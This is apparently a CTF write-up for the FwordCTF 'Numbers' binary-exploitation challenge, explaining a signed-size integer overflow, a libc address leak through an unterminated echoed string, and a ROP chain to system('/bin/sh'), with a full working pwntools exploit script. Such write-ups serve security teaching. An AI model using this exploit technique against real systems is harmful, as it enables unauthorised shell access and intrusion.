Numbers 

The program is a constant prompt that...
1. Reads a number from us
2. Checks if the number is greater than 60, if so it tells us we're naughty and exits
3. Reads that amount of data into a 64 length buffer
4. Prints the data
5. Asks if we want to try again, just dont type n

There's also some prompts inbetween but those aren't important. At first glance, this seems perfectly secure. But actually, note this code snippet.
```javascript
  read(0,local_10,8);
  iVar1 = atoi(local_10);
```
It actually uses atoi to convert our input to a number, and atoi allows signed integers.

This means we can enter a negative number, like -1, and atoi will return `0xffffffff`

the read function takes a size_t parameter - it wont think we're trying to read -1 bytes of data, but `4294967295` bytes of data. Now that's a lot of overflow.

PIE is on, so we cant just overwrite the return address of the integer reading function, ret2plt and call it a day. Because it prints our input back at us, we can exploit it similarly to skywriting from redpwn.

As a recap, strings are terminated by null bytes. When a function, like printf in this case, attempts to print a string, it will continue reading data until it reaches a null byte, at which it will stop.

If we make our input long enough, overwriting null bytes and nudging itself next to some data, said data can be leaked.
Imagine it like this:
```
00 00 00 00 de ad be ef
```
(our input is at the beginning, and we wish to leak the 0xdeadbeef data)
currently this reads as an empty string
let's fill the input with `AAAA`
```
41 41 41 41 de ad be ef
```
Now, the null bytes have been overwritten, so the 0xdeadbeef is part of the string! This reads to be AAAA\xde\ad\be\ef.

8 bytes from the beginning of our buffer is atoi+16, we can leak this using this method and calculate the libc base. Our input is 72 bytes from the return address, so after leaking we will send 72 bytes of padding + poprdi + /bin/sh + retgadget(stack alignment) + system to overwrite the return address of the buffer reading function and pop a shell.

Then, cat `flag.txt` to get the flag.

1. Send size of -1 to gain large buffer overflow
2. Send 8 bytes to leak libc address(atoi+16)
3. Use libc-database find to get the remote libc(libc6_2.28-0ubuntu1_amd64)
4. Use size -1 trick again to overwrite return address and send system("/bin/sh") rop chain to pop a shell
```python
from pwn import *
e = ELF("./numbers")
context.arch = 'amd64'
p = e.process() if args.LOCAL else remote('numbers.fword.wtf', 1237)
libc = e.libc if args.LOCAL else ELF("/home/kali/Tools/libc-database/libs/libc6_2.28-0ubuntu1_amd64/libc.so.6")
def getoutput(data,cont=True):
    p.recvuntil(b"??\n")
    # We send -1 as a number because atoi allows negatives, but read will actually just interpret this as a request to read 0xffffffff bytes, giving us a lot of overflow
    p.send("-1\x00")
    p.recvline()
    # Our input is echoed(safe printf) so we can leak values because of lack of string termination, skywriting style
    p.send(data)
    if not cont:
        return
    p.recvuntil(data)
    ans = p.recvline()
    p.recvuntil(b"?\n")
    p.send('\n')
    return ans[:-1]
num = 0x40
libcleak = getoutput(b'A'*8).ljust(8,b'\x00')
libcleak = u64(libcleak)
log.info(f"Libc leak: {hex(libcleak)}")
libcbase = libcleak - 16 - libc.symbols['atoi']
log.info(f"Libc base: {hex(libcbase)}")
libc.address = libcbase
padding = b'A'*0x48
rop = ROP(libc)
poprdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
retgadget = (rop.find_gadget(['ret']))[0]
chain = flat(poprdi,next(libc.search(b"/bin/sh\x00")),retgadget,libc.symbols['system'])
getoutput(padding + chain,False)
p.interactive()
```

#### Flag: FwordCTF{s1gN3d_nuMb3R5_c4n_b3_d4nG3r0us}
